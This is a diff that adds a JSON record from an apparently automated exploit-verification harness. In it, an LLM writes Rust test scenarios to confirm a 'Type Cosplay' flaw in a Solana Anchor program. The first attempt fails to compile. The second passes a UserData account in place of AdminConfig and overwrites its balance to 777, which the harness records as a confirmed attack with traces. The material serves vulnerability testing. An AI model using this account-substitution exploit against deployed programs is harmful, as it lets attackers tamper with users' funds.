@@ -1,0 +1,134 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: UserData aceita como AdminConfig: balance alterado para 777",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2245,
+        "completion_tokens": 680,
+        "latency_s": 3.94
+      },
+      "raw": "{\n  \"plan\": \"O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. O layout de AdminConfig e UserData e identico (Pubkey + u64), entao um atacante pode passar uma conta UserData no lugar de AdminConfig. O baseline chama update_fee com uma conta AdminConfig legitima (admin = authority) e deve ter sucesso. O ataque passa uma conta UserData cujo campo `authority` e o signer, e verifica se o fee (offset 40) foi alterado, demonstrando que o tipo errado foi aceito.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\n\\n// Conta AdminConfig legitima: admin = authority, fee = 100\\nlet admin_config_data = anchor_account_data(\\\"AdminConfig\\\", &(authority, 100u64));\\nlet admin_config = account(&env.program_id, &admin_config_data, None);\\n\\n// Conta UserData maliciosa: authority = authority (mesmo layout), balance = 999\\nlet user_data_data = anchor_account_data(\\\"UserData\\\", &(authority, 999u64));\\nlet user_data = account(&env.program_id, &user_data_data, None);\\n\\n// Baseline: uso legitimo com AdminConfig\\nlet ix_baseline = env.anchor_ix(\\n    \\\"update_fee\\\",\\n    &(200u64,),\\n    vec![\\n        AccountMeta::new(admin_config.get_key(), false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_baseline = vec![\\n    (admin_config.get_key(), admin_config.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet r_base = env.baseline(\\\"update_fee legitimo com AdminConfig\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: passar UserData no lugar de AdminConfig\\nlet ix_attack = env.anchor_ix(\\n    \\\"update_fee\\\",\\n    &(777u64,),\\n    vec![\\n        AccountMeta::new(user_data.get_key(), false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_attack = vec![\\n    (user_data.get_key(), user_data.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"update_fee com UserData no lugar de AdminConfig\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let fee_apos = read_u64(after(&r, &user_data.get_key()).data(), 40);\\n    env.effect(\\\"UserData aceita como AdminConfig: fee alterado para 777\\\", fee_apos == 777u64);\\n}\"\n}",
+      "plan": "O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. O layout de AdminConfig e UserData e identico (Pubkey + u64), entao um atacante pode passar uma conta UserData no lugar de AdminConfig. O baseline chama update_fee com uma conta AdminConfig legitima (admin = authority) e deve ter sucesso. O ataque passa uma conta UserData cujo campo `authority` e o signer, e verifica se o fee (offset 40) foi alterado, demonstrando que o tipo errado foi aceito.",
+      "scenario": "let authority = Pubkey::new_unique();\n\n// Conta AdminConfig legitima: admin = authority, fee = 100\nlet admin_config_data = anchor_account_data(\"AdminConfig\", &(authority, 100u64));\nlet admin_config = account(&env.program_id, &admin_config_data, None);\n\n// Conta UserData maliciosa: authority = authority (mesmo layout), balance = 999\nlet user_data_data = anchor_account_data(\"UserData\", &(authority, 999u64));\nlet user_data = account(&env.program_id, &user_data_data, None);\n\n// Baseline: uso legitimo com AdminConfig\nlet ix_baseline = env.anchor_ix(\n    \"update_fee\",\n    &(200u64,),\n    vec![\n        AccountMeta::new(admin_config.get_key(), false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_baseline = vec![\n    (admin_config.get_key(), admin_config.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet r_base = env.baseline(\"update_fee legitimo com AdminConfig\", &ix_baseline, &contas_baseline);\n\n// Ataque: passar UserData no lugar de AdminConfig\nlet ix_attack = env.anchor_ix(\n    \"update_fee\",\n    &(777u64,),\n    vec![\n        AccountMeta::new(user_data.get_key(), false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_attack = vec![\n    (user_data.get_key(), user_data.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"update_fee com UserData no lugar de AdminConfig\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let fee_apos = read_u64(after(&r, &user_data.get_key()).data(), 40);\n    env.effect(\"UserData aceita como AdminConfig: fee alterado para 777\", fee_apos == 777u64);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:24:43\n   |\n24 |             AccountMeta::new(admin_config.get_key(), false),\n   |                                           ^^^^^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:29:23\n   |\n29 |         (admin_config.get_key(), admin_config.clone()),\n   |                       ^^^^^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:39:40\n   |\n39 |             AccountMeta::new(user_data.get_key(), false),\n   |                                        ^^^^^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:44:20\n   |\n44 |         (user_data.get_key(), user_data.clone()),\n   |                    ^^^^^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:50:54\n   |\n50 | ...user_data.get_key()).data(), 40);\n   |              ^^^^^^^ method not found in `AccountSharedData`\n\nFor more information about this error, try `rustc --explain E0599`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 5 previous errors",
+        "elapsed_s": 0.8
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:24:43\n   |\n24 |             AccountMeta::new(admin_config.get_key(), false),\n   |                                           ^^^^^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:29:23\n   |\n29 |         (admin_config.get_key(), admin_config.clone()),\n   |                       ^^^^^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:39:40\n   |\n39 |             AccountMeta::new(user_data.get_key(), false),\n   |                                        ^^^^^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:44:20\n   |\n44 |         (user_data.get_key(), user_data.clone()),\n   |                    ^^^^^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `get_key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:50:54\n   |\n50 | ...user_data.get_key()).data(), 40);\n   |              ^^^^^^^ method not found in `AccountSharedData`\n\nFor more information about this error, try `rustc --explain E0599`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 5 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3152,
+        "completion_tokens": 643,
+        "latency_s": 3.43
+      },
+      "raw": "{\"plan\": \"Preparo uma conta AdminConfig legítima (admin = authority) e uma conta UserData com o mesmo layout (authority = authority, balance = 999). O baseline chama update_fee com a AdminConfig, provando que o cenário está correto. O ataque passa a UserData no lugar da AdminConfig; como update_fee usa UncheckedAccount e lê admin de data[8..40], a UserData é aceita e o fee é gravado em data[40..48]. O efeito mede que o campo balance da UserData foi alterado para 777, algo que o uso legítimo nunca faria.\", \"scenario\": \"let authority = Pubkey::new_unique();\\n\\nlet admin_config_key = Pubkey::new_unique();\\nlet user_data_key = Pubkey::new_unique();\\n\\nlet admin_config_data = anchor_account_data(\\\"AdminConfig\\\", &(authority, 100u64));\\nlet admin_config = account(&env.program_id, &admin_config_data, None);\\n\\nlet user_data_data = anchor_account_data(\\\"UserData\\\", &(authority, 999u64));\\nlet user_data = account(&env.program_id, &user_data_data, None);\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"update_fee\\\",\\n    &(200u64,),\\n    vec![\\n        AccountMeta::new(admin_config_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_baseline = vec![\\n    (admin_config_key, admin_config.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet _r_base = env.baseline(\\\"update_fee legitimo com AdminConfig\\\", &ix_baseline, &contas_baseline);\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"update_fee\\\",\\n    &(777u64,),\\n    vec![\\n        AccountMeta::new(user_data_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_attack = vec![\\n    (user_data_key, user_data.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"update_fee com UserData no lugar de AdminConfig\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let balance_apos = read_u64(after(&r, &user_data_key).data(), 40);\\n    env.effect(\\\"UserData aceita como AdminConfig: balance alterado para 777\\\", balance_apos == 777u64);\\n}\"}",
+      "plan": "Preparo uma conta AdminConfig legítima (admin = authority) e uma conta UserData com o mesmo layout (authority = authority, balance = 999). O baseline chama update_fee com a AdminConfig, provando que o cenário está correto. O ataque passa a UserData no lugar da AdminConfig; como update_fee usa UncheckedAccount e lê admin de data[8..40], a UserData é aceita e o fee é gravado em data[40..48]. O efeito mede que o campo balance da UserData foi alterado para 777, algo que o uso legítimo nunca faria.",
+      "scenario": "let authority = Pubkey::new_unique();\n\nlet admin_config_key = Pubkey::new_unique();\nlet user_data_key = Pubkey::new_unique();\n\nlet admin_config_data = anchor_account_data(\"AdminConfig\", &(authority, 100u64));\nlet admin_config = account(&env.program_id, &admin_config_data, None);\n\nlet user_data_data = anchor_account_data(\"UserData\", &(authority, 999u64));\nlet user_data = account(&env.program_id, &user_data_data, None);\n\nlet ix_baseline = env.anchor_ix(\n    \"update_fee\",\n    &(200u64,),\n    vec![\n        AccountMeta::new(admin_config_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_baseline = vec![\n    (admin_config_key, admin_config.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet _r_base = env.baseline(\"update_fee legitimo com AdminConfig\", &ix_baseline, &contas_baseline);\n\nlet ix_attack = env.anchor_ix(\n    \"update_fee\",\n    &(777u64,),\n    vec![\n        AccountMeta::new(user_data_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_attack = vec![\n    (user_data_key, user_data.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"update_fee com UserData no lugar de AdminConfig\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let balance_apos = read_u64(after(&r, &user_data_key).data(), 40);\n    env.effect(\"UserData aceita como AdminConfig: balance alterado para 777\", balance_apos == 777u64);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legitimo com AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "9c0a4fa147093e4d",
+                "digest": "bb2574fd7d2eefb2",
+                "post": "9c0a4fa147093e4d0000000000000001000000000000000000000000000000000000000000000000c800000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com UserData no lugar de AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "8bf8a7cbfddcd2dd",
+                "digest": "25554c6ecb015b51",
+                "post": "8bf8a7cbfddcd2dd00000000000000010000000000000000000000000000000000000000000000000903000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "UserData aceita como AdminConfig: balance alterado para 777",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: UserData aceita como AdminConfig: balance alterado para 777"
+    }
+  ],
+  "case_id": "SSP-06-A-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Type Cosplay."
+  }
+}
